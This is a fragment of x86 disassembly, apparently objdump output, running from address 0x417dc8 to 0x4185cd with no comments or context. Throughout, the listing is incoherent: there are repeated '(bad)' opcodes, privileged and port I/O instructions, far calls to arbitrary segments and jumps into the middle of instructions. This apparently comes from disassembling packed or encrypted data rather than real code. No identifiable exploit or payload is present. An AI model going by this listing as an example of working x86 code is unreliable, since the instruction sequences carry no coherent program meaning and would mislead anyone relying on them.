  417dc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417dc9:	lock add dh,BYTE PTR [edx]
  417dcc:	(bad)  
  417dcd:	sahf   
  417dce:	push   ecx
  417dcf:	mov    eax,DWORD PTR [edi-0x39059846]
  417dd5:	or     al,0xc3
  417dd7:	aam    0xa4
  417dd9:	aas    
  417dda:	mov    ebp,0x196547f2
  417ddf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417de0:	dec    edi
  417de1:	add    DWORD PTR [eax-0x23b85396],ecx
  417de7:	dec    edi
  417de8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417de9:	sbb    ebp,DWORD PTR [ebx-0x18ba3da9]
  417def:	jbe    0x417d82
  417df1:	retf   
  417df2:	xor    ecx,DWORD PTR [esi+0x714f34db]
  417df8:	dec    eax
  417df9:	ins    DWORD PTR es:[edi],dx
  417dfa:	add    DWORD PTR [ebx+eax*4+0x2d8e7ac7],esi
  417e01:	pop    ebx
  417e02:	adc    dh,cl
  417e04:	mov    WORD PTR [ecx-0x33b8afbb],?
  417e0a:	push   cs
  417e0b:	aas    
  417e0c:	xchg   BYTE PTR [esi-0x65],bl
  417e0f:	les    edi,FWORD PTR [eax]
  417e11:	cmp    dh,cl
  417e13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417e14:	or     al,0x18
  417e16:	dec    ebx
  417e17:	inc    ebp
  417e18:	test   eax,0x235ea24c
  417e1d:	jo     0x417e68
  417e1f:	jmp    0x426712e4
  417e24:	outs   dx,DWORD PTR ds:[esi]
  417e25:	ins    BYTE PTR es:[edi],dx
  417e26:	jmp    0x8f13c2e6
  417e2b:	imul   edx,DWORD PTR [ebx+eiz*1],0xed9c8475
  417e32:	jnp    0x417e8d
  417e34:	sahf   
  417e35:	sbb    al,0x11
  417e37:	call   0xb7c2:0x72ffa19a
  417e3e:	sub    ah,BYTE PTR [edi+0x1967e9fe]
  417e44:	xchg   esp,eax
  417e45:	out    0xf0,al
  417e47:	stos   DWORD PTR es:[edi],eax
  417e48:	jmp    0x417e28
  417e4a:	and    BYTE PTR [ebp-0x1b0af398],bh
  417e50:	mov    ah,0xc4
  417e52:	push   edi
  417e53:	leave  
  417e54:	fild   DWORD PTR [ebx+0x6b1b6650]
  417e5a:	xor    al,0xa8
  417e5c:	dec    ebx
  417e5d:	js     0x417ea6
  417e5f:	mov    edx,0xc82ff0
  417e64:	das    
  417e65:	dec    ebp
  417e66:	xor    eax,0xf9c4bb55
  417e6b:	mov    dl,0x9
  417e6d:	rcr    DWORD PTR [ebx-0x75f892b6],cl
  417e73:	dec    esp
  417e74:	out    dx,eax
  417e75:	ret    
  417e76:	pop    esi
  417e77:	fabs   
  417e79:	sub    BYTE PTR [edi],dl
  417e7b:	test   edi,esi
  417e7d:	lods   eax,DWORD PTR ds:[esi]
  417e7e:	pop    es
  417e7f:	mov    ebx,0xcd9d450b
  417e84:	and    BYTE PTR [ebx],dl
  417e86:	push   ebx
  417e87:	mov    al,0xf4
  417e89:	ret    
  417e8a:	icebp  
  417e8b:	adc    BYTE PTR [eax+0x29],ah
  417e8e:	pop    ss
  417e8f:	aas    
  417e90:	mov    ah,0x1c
  417e92:	iret   
  417e93:	cmc    
  417e94:	jp     0x417e32
  417e96:	sti    
  417e97:	or     edx,DWORD PTR [esi]
  417e99:	scas   al,BYTE PTR es:[edi]
  417e9a:	cmc    
  417e9b:	neg    DWORD PTR [edx+esi*2+0x51]
  417e9f:	adc    al,0xfd
  417ea1:	in     eax,dx
  417ea2:	gs call 0x8f31:0xc40ac58
  417eaa:	cli    
  417eab:	pop    ss
  417eac:	mov    DWORD PTR [edi+0x3],ebp
  417eaf:	test   al,0x43
  417eb1:	jae    0x417f2d
  417eb3:	aas    
  417eb4:	leave  
  417eb5:	add    DWORD PTR [eax+0x13],0xd
  417eb9:	cld    
  417eba:	xor    DWORD PTR [eax+eiz*2-0x70],esi
  417ebe:	push   ebx
  417ebf:	ret    
  417ec0:	stc    
  417ec1:	iret   
  417ec2:	out    dx,eax
  417ec3:	inc    esp
  417ec4:	mov    bl,0x63
  417ec6:	call   0xf7710519
  417ecb:	adc    al,0x72
  417ecd:	jl     0x417eb1
  417ecf:	jmp    0x52665157
  417ed4:	mov    al,0xca
  417ed6:	rol    DWORD PTR [esi+0xaeca5d8],1
  417edc:	in     eax,0x70
  417ede:	imul   ebx,esi,0x6e05eb4d
  417ee4:	ins    BYTE PTR es:[edi],dx
  417ee5:	cwde   
  417ee6:	jp     0x417eda
  417ee8:	out    dx,eax
  417ee9:	sbb    BYTE PTR [ebx-0x40e105a8],dl
  417eef:	inc    edi
  417ef0:	cwde   
  417ef1:	shr    dh,cl
  417ef3:	dec    ecx
  417ef4:	mov    ch,0x37
  417ef6:	cmp    bl,ch
  417ef8:	sub    BYTE PTR [ecx+0x32],dl
  417efb:	fdivr  DWORD PTR [esi+0x4c8ee518]
  417f01:	xrelease xchg DWORD PTR [eax-0x54],ebx
  417f05:	lahf   
  417f06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417f07:	xchg   ebx,eax
  417f08:	jae    0x417f0e
  417f0a:	aas    
  417f0b:	mov    edi,DWORD PTR [ecx]
  417f0d:	or     al,BYTE PTR [edx-0x3d]
  417f10:	imul   esp,DWORD PTR [edi+0x4408faa0],0xc3953299
  417f1a:	inc    ebp
  417f1b:	push   0xb
  417f1d:	out    0xc9,al
  417f1f:	call   0x211:0xb3711f9c
  417f26:	dec    ebx
  417f27:	push   DWORD PTR [edx+0x7b9e3f2]
  417f2d:	jmp    0x417ee0
  417f2f:	sbb    al,0xcb
  417f31:	inc    ecx
  417f32:	adc    BYTE PTR [ebp+0x4f7f1106],bh
  417f38:	jnp    0x417f27
  417f3a:	or     eax,0x4bb59380
  417f3f:	sub    ecx,esi
  417f41:	das    
  417f42:	and    eax,0x65eae14c
  417f47:	jmp    0x417f4f
  417f49:	sahf   
  417f4a:	xchg   edi,eax
  417f4b:	mov    BYTE PTR [ecx-0x39c88bb8],cl
  417f51:	ror    BYTE PTR fs:[edx],cl
  417f54:	jb     0x417efb
  417f56:	pushf  
  417f57:	or     eax,0xf3d82f68
  417f5c:	mov    esi,DWORD PTR [eax]
  417f5e:	jle    0x417f88
  417f60:	cdq    
  417f61:	cmp    eax,0x95341c9d
  417f66:	gs pop ebp
  417f68:	imul   eax,DWORD PTR [esi-0x4ff8ee17],0x961dee59
  417f72:	push   es
  417f73:	push   0xf24ebeb5
  417f78:	fild   QWORD PTR [ecx-0x12810494]
  417f7e:	imul   DWORD PTR [edi-0x4a01902]
  417f84:	mov    ebx,0x29bf7b92
  417f89:	pop    ebx
  417f8a:	xchg   BYTE PTR [eax+0x4f],ah
  417f8d:	and    bh,bh
  417f8f:	gs pop edx
  417f91:	sbb    ah,bh
  417f93:	stc    
  417f94:	mov    esp,edi
  417f96:	imul   ebx,DWORD PTR [edx+0x24],0x1cd4f3a
  417f9d:	cdq    
  417f9e:	mov    dl,0xaf
  417fa0:	pop    ss
  417fa1:	daa    
  417fa2:	fadd   QWORD PTR [esi-0x12ab6a]
  417fa8:	or     cl,BYTE PTR [esi+0x1f590016]
  417fae:	mov    ebp,DWORD PTR [ecx-0x39]
  417fb1:	push   esi
  417fb2:	jnp    0x418006
  417fb4:	cmp    al,BYTE PTR [ebx+eax*1+0x55]
  417fb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417fb9:	mov    ds:0x29f01ec0,al
  417fbe:	repnz sbb al,0x53
  417fc1:	shr    BYTE PTR [edi-0xc],cl
  417fc4:	dec    esp
  417fc5:	adc    esp,DWORD PTR [eax]
  417fc7:	sbb    esp,esp
  417fc9:	lds    ebx,FWORD PTR [esi-0x181d7221]
  417fcf:	mov    eax,ds:0xae7f63ce
  417fd4:	xchg   edi,eax
  417fd5:	out    0x70,al
  417fd7:	pop    ecx
  417fd8:	das    
  417fd9:	lds    ebx,FWORD PTR [ecx]
  417fdb:	pop    edi
  417fdc:	fwait
  417fdd:	add    al,0xbf
  417fdf:	push   esi
  417fe0:	mov    dh,0x61
  417fe2:	dec    edx
  417fe3:	test   al,0x4
  417fe5:	adc    eax,0x11ead215
  417fea:	adc    eax,esp
  417fec:	push   ecx
  417fed:	push   edx
  417fee:	outs   dx,DWORD PTR ds:[esi]
  417fef:	inc    edx
  417ff0:	call   0xd3a8:0x78729720
  417ff7:	das    
  417ff8:	scas   al,BYTE PTR es:[edi]
  417ff9:	dec    ebx
  417ffa:	call   0x842d:0x3e339d8d
  418001:	rcl    edx,0x86
  418004:	inc    BYTE PTR [edx-0x6]
  418007:	sbb    eax,0xeac296ec
  41800c:	and    eax,0x51f96cfd
  418011:	sbb    al,BYTE PTR [ebx-0x33d1072]
  418017:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418018:	cmp    esi,edi
  41801a:	std    
  41801b:	xchg   ecx,eax
  41801c:	and    BYTE PTR [edx],bl
  41801e:	pop    esp
  41801f:	(bad)  
  418020:	sbb    esi,DWORD PTR [ebx-0x1cc64468]
  418026:	test   al,0x62
  418028:	inc    ebp
  418029:	mov    cl,0xf7
  41802b:	retf   0xb2c5
  41802e:	shl    DWORD PTR [ebx+0x7d],cl
  418031:	(bad)  
  418032:	and    bh,bl
  418034:	jno    0x417fc4
  418036:	pop    ebx
  418037:	mov    ds:0x417db051,eax
  41803c:	mov    edx,0x3732105a
  418041:	aam    0x4f
  418043:	(bad)  
  418044:	mov    ah,0xed
  418046:	cmp    esp,edx
  418048:	mov    al,BYTE PTR [ebx]
  41804a:	adc    eax,edi
  41804c:	pop    esp
  41804d:	cmp    BYTE PTR [edi-0x78b42a33],dl
  418053:	cmc    
  418054:	mov    al,0x68
  418056:	icebp  
  418057:	mov    esp,0x72174104
  41805c:	out    dx,eax
  41805d:	dec    ebx
  41805e:	jl     0x4180a7
  418060:	add    al,0xe9
  418062:	pushf  
  418063:	push   ebp
  418064:	fmul   DWORD PTR [ecx+ecx*8+0x12a9c27b]
  41806b:	inc    edi
  41806c:	(bad)  
  41806d:	mov    ch,0x4a
  41806f:	xchg   esp,eax
  418070:	jl     0x418004
  418072:	jo     0x418002
  418074:	out    dx,al
  418075:	mov    edi,0xa04e0b97
  41807a:	gs jne 0x41807d
  41807d:	adc    BYTE PTR [edi],bl
  41807f:	fidiv  WORD PTR [ebp-0x71]
  418082:	bound  esi,QWORD PTR [ebx+0x3eee80b7]
  418088:	outs   dx,DWORD PTR ds:[esi]
  418089:	retf   
  41808a:	or     ch,ch
  41808c:	pusha  
  41808d:	sub    bl,BYTE PTR [edi]
  41808f:	pop    ds
  418090:	dec    dh
  418092:	jl     0x418113
  418094:	aas    
  418095:	sub    ch,BYTE PTR [ebp-0x65]
  418098:	xor    eax,0xf3d5972b
  41809d:	ds or  eax,0xe84150c8
  4180a3:	(bad)
  4180a6:	sbb    BYTE PTR [edx+0x617e0781],dl
  4180ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4180ad:	pusha  
  4180ae:	icebp  
  4180af:	push   edi
  4180b0:	pop    ecx
  4180b1:	adc    esi,DWORD PTR [esi]
  4180b3:	icebp  
  4180b4:	imul   ecx,ecx,0x72275e0c
  4180ba:	sti    
  4180bb:	cmc    
  4180bc:	mov    edi,0x140e1b99
  4180c1:	inc    ebp
  4180c2:	bound  edx,QWORD PTR [ecx+0x38628892]
  4180c8:	data16 mov ds:0x7cfec586,al
  4180ce:	in     eax,0xb6
  4180d0:	nop
  4180d1:	retf   0xdefc
  4180d4:	pop    esp
  4180d5:	bound  eax,QWORD PTR [edx+0x3c311a8]
  4180db:	iret   
  4180dc:	pop    eax
  4180dd:	sub    al,0x66
  4180df:	adc    BYTE PTR [esi-0x1db53034],bh
  4180e5:	data16 jge 0x4180ab
  4180e8:	push   edx
  4180e9:	sbb    dl,ah
  4180eb:	int    0x26
  4180ed:	mov    ebp,0xee1055e8
  4180f2:	mov    ebx,DWORD PTR [eax-0x458fedb0]
  4180f8:	loope  0x4180a6
  4180fa:	cld    
  4180fb:	or     DWORD PTR [ebx+eiz*2-0x62],esi
  4180ff:	js     0x418117
  418101:	test   ah,0x45
  418104:	sub    edi,edi
  418106:	fisttp WORD PTR [esi-0x64]
  418109:	enter  0xb52b,0xc5
  41810d:	jnp    0x41816b
  41810f:	and    ebx,ebp
  418111:	addr16 clc 
  418113:	fwait
  418114:	mov    ds:0x78ad9399,al
  418119:	xchg   edi,eax
  41811a:	adc    dh,dh
  41811c:	mov    db6,ecx
  41811f:	mov    ebp,0x51062fad
  418124:	pop    ebp
  418125:	jno    0x418185
  418127:	add    al,0xf3
  418129:	xor    BYTE PTR [edx+0xdcff60f],bh
  41812f:	sub    eax,esp
  418131:	(bad)  
  418132:	cwde   
  418133:	push   edi
  418134:	loope  0x418193
  418136:	sahf   
  418137:	cmc    
  418138:	out    0x49,al
  41813a:	lods   eax,DWORD PTR ds:[esi]
  41813b:	retf   
  41813c:	cmp    al,0x1f
  41813e:	iret   
  41813f:	inc    ebx
  418140:	daa    
  418141:	outs   dx,DWORD PTR ds:[esi]
  418142:	fwait
  418143:	retf   0x9dea
  418146:	(bad)  
  418147:	gs mov ecx,0x26669ccc
  41814d:	jbe    0x418168
  41814f:	rcr    bh,cl
  418151:	aad    0x1d
  418153:	jl     0x4181cc
  418155:	cmp    cl,BYTE PTR [ecx-0x60]
  418158:	xchg   edi,eax
  418159:	pop    edi
  41815a:	adc    bh,BYTE PTR [ebp+0x55]
  41815d:	or     BYTE PTR [edi-0x11e539ce],dh
  418163:	lock icebp 
  418165:	test   ebx,ebp
  418167:	pop    ds
  418168:	clc    
  418169:	into   
  41816a:	nop
  41816b:	sub    DWORD PTR [ecx-0x4d],0x7f7c7e9e
  418172:	cmp    edi,DWORD PTR [esi]
  418174:	fwait
  418175:	loopne 0x418157
  418177:	es push eax
  418179:	js     0x418148
  41817b:	sub    DWORD PTR [esi],esp
  41817d:	fcom   QWORD PTR [ebx-0xa6c0a84]
  418183:	cs push ecx
  418185:	mov    ecx,0xdbd1325e
  41818a:	int    0xeb
  41818c:	cdq    
  41818d:	xlat   BYTE PTR ds:[ebx]
  41818e:	sbb    al,0x94
  418190:	adc    dh,bh
  418192:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418193:	fist   WORD PTR [ebp+0x66]
  418196:	pop    es
  418197:	adc    BYTE PTR [ecx],0x8c
  41819a:	rcl    DWORD PTR ds:0xb517d833,1
  4181a0:	xchg   BYTE PTR [edi+ecx*4-0x149d4941],ah
  4181a7:	lock push ss
  4181a9:	sti    
  4181aa:	xor    DWORD PTR [ecx-0x3d4352e7],ecx
  4181b0:	out    dx,eax
  4181b1:	cmp    al,0x1c
  4181b3:	iret   
  4181b4:	aam    0xe7
  4181b6:	fsub   st(3),st
  4181b8:	mov    bl,0xd3
  4181ba:	fld    DWORD PTR [edx+0x7cb46189]
  4181c0:	xor    cl,cl
  4181c2:	jno    0x418190
  4181c4:	fild   DWORD PTR [ebx]
  4181c6:	and    eax,0x6e48f4b4
  4181cb:	or     al,0x8c
  4181cd:	adc    DWORD PTR [edx+0x1d71ac6e],eax
  4181d3:	add    eax,0x6df19ce
  4181d8:	call   0xd448:0x75aac516
  4181df:	adc    bh,BYTE PTR [eax]
  4181e1:	les    esi,FWORD PTR [ebx+ecx*1-0x7780b85a]
  4181e8:	xor    DWORD PTR [ebp+0xf],esi
  4181eb:	(bad)  [edx+0x3d933fca]
  4181f1:	pop    edx
  4181f2:	mov    al,ds:0x438f1131
  4181f7:	stos   BYTE PTR es:[edi],al
  4181f8:	fistp  QWORD PTR ss:[edx+0x70039602]
  4181ff:	jle    0x418274
  418201:	pop    ebx
  418202:	sbb    dl,al
  418204:	pop    ebp
  418205:	xchg   edx,eax
  418206:	(bad)  
  418207:	dec    edi
  418208:	mov    ds:0x8c53deb5,al
  41820d:	jnp    0x418225
  41820f:	mov    DWORD PTR [ecx],esp
  418211:	and    DWORD PTR cs:[ebx+0x37],ecx
  418215:	cli    
  418216:	sbb    BYTE PTR [ebx+0x6d70038a],ah
  41821c:	shr    BYTE PTR [ebp-0x77],0x6a
  418220:	cmp    al,0x7a
  418222:	mov    cl,0x53
  418224:	cmp    esi,DWORD PTR [ebx-0xdf656]
  41822a:	scas   al,BYTE PTR es:[edi]
  41822b:	sub    eax,0xd67723a3
  418230:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418231:	and    eax,0x5adb0aca
  418236:	mov    ch,ch
  418238:	xchg   ebx,eax
  418239:	cmp    dl,BYTE PTR [ebp+0x11]
  41823c:	clc    
  41823d:	hlt    
  41823e:	sbb    eax,0xb1b9469c
  418243:	jecxz  0x4181ff
  418245:	cmp    eax,0xaf55d2c2
  41824a:	and    DWORD PTR ds:0xb0d5f99b,eax
  418250:	mov    al,0xd6
  418252:	leave  
  418253:	(bad)  [ebx]
  418255:	jecxz  0x4181fd
  418257:	lods   al,BYTE PTR ds:[esi]
  418258:	push   eax
  418259:	jle    0x4181fa
  41825b:	pushf  
  41825c:	jmp    0x418283
  41825e:	and    bh,BYTE PTR [ecx+0x43502693]
  418264:	dec    edx
  418265:	dec    edx
  418266:	out    0xea,al
  418268:	pop    esp
  418269:	aaa    
  41826a:	or     DWORD PTR [edx+0x91a5a5],ecx
  418270:	ins    BYTE PTR es:[edi],dx
  418271:	repnz dec ebx
  418273:	jl     0x418288
  418275:	bound  eax,QWORD PTR [eax]
  418277:	frstor [esi+0x31a57587]
  41827d:	dec    edi
  41827e:	psubusb mm1,QWORD PTR [eax-0x2bdb71f7]
  418285:	pop    ds
  418286:	cpuid  
  418288:	fstp   DWORD PTR [edx]
  41828a:	inc    esp
  41828b:	jmp    0xdc4fed52
  418290:	call   0x895a:0x370248c5
  418297:	sahf   
  418298:	xlat   BYTE PTR ds:[ebx]
  418299:	or     DWORD PTR [esi-0x6f],esi
  41829c:	cmp    dl,BYTE PTR [ecx+0x2f]
  41829f:	(bad)  
  4182a0:	sahf   
  4182a1:	lock xor edi,DWORD PTR [ecx+0x4f390f65]
  4182a8:	fdivr  QWORD PTR [eax+0x1a74edda]
  4182ae:	ficomp WORD PTR ds:0x95fa2ed3
  4182b4:	(bad)  
  4182b5:	aad    0x1b
  4182b7:	inc    edi
  4182b8:	retf   
  4182b9:	xchg   ch,al
  4182bb:	cmp    ch,BYTE PTR [esi]
  4182bd:	and    DWORD PTR [edi+0x1fdb2442],ebp
  4182c3:	jmp    DWORD PTR [eax+edi*1-0x62ac9adb]
  4182ca:	(bad)  
  4182cc:	mov    ch,0x22
  4182ce:	cmp    BYTE PTR [eax+0x71],dl
  4182d1:	xchg   ecx,eax
  4182d2:	ins    DWORD PTR es:[edi],dx
  4182d3:	sub    eax,0xd7c8dad5
  4182d8:	stos   BYTE PTR es:[edi],al
  4182d9:	jp     0x4182c1
  4182db:	mov    ebp,0xdd6ad5ba
  4182e0:	xchg   ebp,eax
  4182e1:	cmp    dh,BYTE PTR [ebx]
  4182e3:	ja     0x418291
  4182e5:	mov    esp,0x42e55824
  4182ea:	out    dx,eax
  4182eb:	mov    esi,0xc979a22d
  4182f0:	push   0x6d27d3d3
  4182f5:	inc    eax
  4182f6:	jle    0x418299
  4182f8:	mov    BYTE PTR [eax-0x7fc7e2be],ah
  4182fe:	adc    DWORD PTR [ecx],ecx
  418300:	inc    ebx
  418301:	or     DWORD PTR [ecx+0x1e9a2ab2],0x42
  418308:	out    dx,al
  418309:	jne    0x418372
  41830b:	mov    eax,0x17af2262
  418310:	sbb    DWORD PTR [eax],ecx
  418312:	sbb    eax,0x62635e6a
  418317:	pop    es
  418318:	loop   0x4182b9
  41831a:	cdq    
  41831b:	arpl   WORD PTR [edx+esi*4+0x2f],dx
  41831f:	xchg   ecx,eax
  418320:	dec    edx
  418321:	sbb    eax,0x582d903c
  418326:	ficomp WORD PTR [ebp+0x51]
  418329:	cmp    DWORD PTR [eax+0x3ec7e7c5],0x98c3d939
  418333:	sbb    al,0xc7
  418335:	xor    BYTE PTR ds:0xa3a956d8,ah
  41833b:	mov    ss,WORD PTR [esi-0x6c]
  41833e:	cmp    DWORD PTR [esi],0x156e1006
  418344:	mov    DWORD PTR [ebp+0x59901753],ecx
  41834a:	popa   
  41834b:	sub    al,0xcd
  41834d:	in     eax,0xba
  41834f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418350:	(bad)  
  418352:	fsubrp st(0),st
  418354:	jl     0x418328
  418356:	pop    ecx
  418357:	addr16 and al,0xb3
  41835a:	xchg   BYTE PTR [edi],dh
  41835c:	cmp    DWORD PTR [edi-0x7f52d7f6],edi
  418362:	sub    BYTE PTR [eax-0x78],ch
  418365:	mov    cl,0x25
  418367:	sub    al,0x1
  418369:	mov    esp,0xaf028065
  41836e:	or     bl,BYTE PTR [ebx-0xcc4cecc]
  418374:	push   ecx
  418375:	xchg   edx,eax
  418376:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418377:	xor    al,0x30
  418379:	jmp    0xcc633701
  41837e:	sub    BYTE PTR [edx+ecx*8],bl
  418381:	lahf   
  418382:	inc    esp
  418383:	and    esi,DWORD PTR [edx-0x54ba73ca]
  418389:	mov    BYTE PTR [ebx+0x1a],ah
  41838c:	ret    
  41838d:	or     eax,0xb7232ced
  418392:	push   cs
  418393:	jge    0x418379
  418395:	(bad)  
  418396:	in     al,dx
  418397:	sbb    eax,0xa34dfb32
  41839c:	outs   dx,DWORD PTR ds:[esi]
  41839d:	push   ebx
  41839e:	jne    0x4183b9
  4183a0:	lods   eax,DWORD PTR ds:[esi]
  4183a1:	out    dx,al
  4183a2:	push   edx
  4183a3:	sub    esp,DWORD PTR [edi-0x291ffd36]
  4183a9:	int    0x98
  4183ab:	push   ebp
  4183ac:	mov    edi,0xbb2cbcab
  4183b1:	ret    0x5dbf
  4183b4:	xchg   BYTE PTR [eax],cl
  4183b6:	adc    BYTE PTR [edi+0x61754703],0x4e
  4183bd:	adc    al,BYTE PTR [ebx]
  4183bf:	rol    edi,0xfb
  4183c2:	jmp    0x418418
  4183c4:	lahf   
  4183c5:	cwde   
  4183c6:	sbb    al,0xd0
  4183c9:	mov    ds,WORD PTR [esi]
  4183cb:	xlat   BYTE PTR ds:[ebx]
  4183cc:	int3   
  4183cd:	dec    esi
  4183ce:	in     al,dx
  4183cf:	jo     0x4183ff
  4183d1:	gs (bad) 
  4183d4:	mov    ds:0x299a0630,eax
  4183d9:	adc    DWORD PTR [ecx+0x4ece9b88],edi
  4183df:	jg     0x418412
  4183e1:	loope  0x4183c7
  4183e3:	imul   edi,DWORD PTR [esi+0x24],0xffffffb2
  4183e7:	int    0xbf
  4183e9:	mov    esi,0x22db1781
  4183ee:	inc    ebx
  4183ef:	rcl    DWORD PTR [edx-0x48],0x7a
  4183f3:	mov    eax,ds:0x52a2727e
  4183f8:	test   DWORD PTR [eax-0x2],ebx
  4183fb:	in     eax,dx
  4183fc:	lea    ecx,[edi+0x5a]
  4183ff:	and    al,0xeb
  418401:	add    eax,0x4d2ad37e
  418406:	ss fwait
  418408:	arpl   WORD PTR [eax-0x17aec70e],di
  41840e:	xor    ebp,esp
  418410:	dec    esp
  418411:	add    DWORD PTR [ebp+0x6e],0x8da69348
  418418:	lea    ebp,[edi]
  41841a:	jge    0x41842e
  41841c:	jmp    0x418406
  41841e:	call   0x9096:0x983a17a2
  418425:	scas   eax,DWORD PTR es:[edi]
  418426:	fdivr  QWORD PTR [ebx-0x43]
  418429:	gs inc ecx
  41842b:	pop    eax
  41842c:	lods   eax,DWORD PTR ds:[esi]
  41842d:	mov    edi,0x2f7017f4
  418432:	lds    ebp,FWORD PTR [ebx+0x46b00d6d]
  418438:	popa   
  418439:	inc    ebp
  41843a:	fcom   DWORD PTR [eax]
  41843c:	test   ebx,edi
  41843e:	rcr    DWORD PTR [ebp-0x33],0x72
  418442:	js     0x418436
  418444:	push   ebx
  418445:	sar    DWORD PTR fs:[ebp+edx*4-0x4a4dba9e],cl
  41844d:	push   edx
  41844e:	test   BYTE PTR [esi],bl
  418450:	nop
  418451:	pop    ebx
  418452:	sar    DWORD PTR [ebp+0x3e1fdfa6],1
  418458:	(bad)  
  418459:	cmp    bx,cx
  41845c:	stos   BYTE PTR es:[edi],al
  41845d:	loopne 0x418435
  41845f:	retf   
  418460:	iret   
  418461:	aas    
  418462:	mov    bh,0x80
  418464:	mov    dh,0x2f
  418466:	call   eax
  418468:	xor    DWORD PTR [eax],0xead91bee
  41846e:	push   ebx
  41846f:	cmp    ecx,esp
  418471:	hlt    
  418472:	pop    esi
  418473:	jae    0x4184ab
  418475:	call   0xe485440b
  41847a:	ret    
  41847b:	sbb    DWORD PTR [edi+0x50],ecx
  41847e:	nop
  41847f:	shr    DWORD PTR [esi],cl
  418481:	add    esp,edi
  418483:	lds    ecx,FWORD PTR [ebp-0x41309a47]
  418489:	imul   edi,ecx,0x49
  41848c:	xlat   BYTE PTR ds:[ebx]
  41848d:	dec    eax
  41848e:	inc    ebx
  41848f:	pop    edi
  418490:	(bad)  
  418492:	push   ecx
  418493:	adc    al,0xda
  418495:	push   esi
  418496:	cmp    DWORD PTR [edi+0x51],ebp
  418499:	dec    esp
  41849a:	jecxz  0x418505
  41849c:	ret    
  41849d:	and    esp,esi
  41849f:	imul   edx,DWORD PTR [ebp+0x8],0xffffff9f
  4184a3:	sub    DWORD PTR [edi],ebx
  4184a5:	mov    edx,0x97744f9e
  4184aa:	sbb    cl,BYTE PTR [eax-0x10]
  4184ad:	ficom  WORD PTR [edi+0x5c]
  4184b0:	(bad)  
  4184b2:	clc    
  4184b3:	ret    
  4184b4:	rcl    DWORD PTR [edi+0x38],0x61
  4184b8:	cmp    al,0x39
  4184ba:	xchg   BYTE PTR [ecx+0x51fa5bd2],ah
  4184c0:	leave  
  4184c1:	inc    ch
  4184c3:	jne    0x41844f
  4184c5:	cmp    DWORD PTR [ebp-0x7b],0x9
  4184c9:	out    dx,al
  4184ca:	and    ah,BYTE PTR [eax+0x4b]
  4184cd:	test   eax,0x1446a1f7
  4184d2:	sub    BYTE PTR [edi+ebx*2-0x75d53c00],bl
  4184d9:	inc    eax
  4184da:	jecxz  0x4184d1
  4184dc:	push   edi
  4184dd:	sub    ch,BYTE PTR [eax-0x27e7c30]
  4184e3:	pushf  
  4184e4:	lds    ebx,FWORD PTR [esi+0x3cba94d6]
  4184ea:	popf   
  4184eb:	lahf   
  4184ec:	push   esi
  4184ed:	or     al,0x67
  4184ef:	and    DWORD PTR [esp+edx*1-0x43],ebp
  4184f3:	xor    BYTE PTR [esp+ebp*1-0x1a],dl
  4184f7:	dec    esp
  4184f8:	test   al,0xbf
  4184fa:	shr    BYTE PTR [ecx+0x3a01fd8a],1
  418500:	fwait
  418501:	das    
  418502:	mov    BYTE PTR [eax],bl
  418504:	add    edi,edi
  418506:	push   eax
  418507:	mov    dh,0x4b
  418509:	aad    0xd
  41850b:	cmp    DWORD PTR [ebx+0x4816c037],0xffffffdc
  418512:	inc    edx
  418513:	(bad)
  418516:	stos   DWORD PTR es:[edi],eax
  418517:	js     0x418536
  418519:	push   ds
  41851a:	mov    ecx,0x62d16f8c
  41851f:	and    DWORD PTR [edx+0x694bf9d9],0x95d7d9ac
  418529:	shl    DWORD PTR [esi-0x6c],0xd6
  41852d:	aaa    
  41852e:	aaa    
  41852f:	ins    DWORD PTR es:[edi],dx
  418530:	mov    ecx,0xbf8d2b44
  418535:	add    BYTE PTR [ebx+0x4a2bd614],al
  41853b:	mov    cl,0x4a
  41853d:	mov    ch,0xef
  41853f:	in     eax,dx
  418540:	clc    
  418541:	cmp    BYTE PTR [eax-0x51],ah
  418544:	xchg   ebx,eax
  418545:	call   0x735672bd
  41854a:	pop    eax
  41854b:	add    al,0xd
  41854d:	outs   dx,DWORD PTR ds:[esi]
  41854e:	fbld   TBYTE PTR [ebp+0x6558276]
  418554:	int    0x43
  418556:	dec    edx
  418557:	mov    ebx,0xa2ea2032
  41855c:	adc    DWORD PTR [ebx+0xc],0x72
  418560:	popaw  
  418562:	pop    ss
  418563:	xchg   cl,bl
  418565:	(bad)  
  418566:	iret   
  418567:	ret    0x6006
  41856a:	push   ebx
  41856b:	pop    ds
  41856c:	inc    ebp
  41856d:	pop    ecx
  41856e:	xchg   ebp,eax
  41856f:	fisub  WORD PTR [ecx+0x57e0c4b]
  418575:	pusha  
  418576:	or     eax,0x2ffd4d98
  41857b:	and    eax,0x33aa70bf
  418580:	sub    al,0xd1
  418582:	hlt    
  418583:	xor    BYTE PTR cs:[esi-0x77],ch
  418587:	mov    ecx,0x28994575
  41858c:	pop    esi
  41858d:	add    edi,ebp
  41858f:	fnstcw WORD PTR [edi+0x70]
  418592:	lods   eax,DWORD PTR ds:[esi]
  418593:	stc    
  418594:	imul   eax,ebp,0xffffffd1
  418597:	push   ebx
  418598:	pop    ebp
  418599:	jns    0x418542
  41859b:	jmp    0x71da8985
  4185a0:	(bad)  
  4185a1:	(bad)  
  4185a2:	add    BYTE PTR [edx+eiz*4-0x6a110102],bh
  4185a9:	popf   
  4185aa:	or     BYTE PTR [ebx],0xda
  4185ad:	jmp    0x4185f2
  4185af:	cmp    DWORD PTR [edi-0xbe5bd8b],ebp
  4185b5:	mov    esi,DWORD PTR [edi-0xf545a8f]
  4185bb:	popf   
  4185bc:	das    
  4185bd:	mov    esi,DWORD PTR [eax-0x7a]
  4185c0:	pop    ds
  4185c1:	lock push esp
  4185c3:	inc    eax
  4185c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4185c5:	mov    al,ds:0x90720999
  4185ca:	add    cl,ch
  4185cc:	pop    ds
  4185cd:	fadd   st(4),st
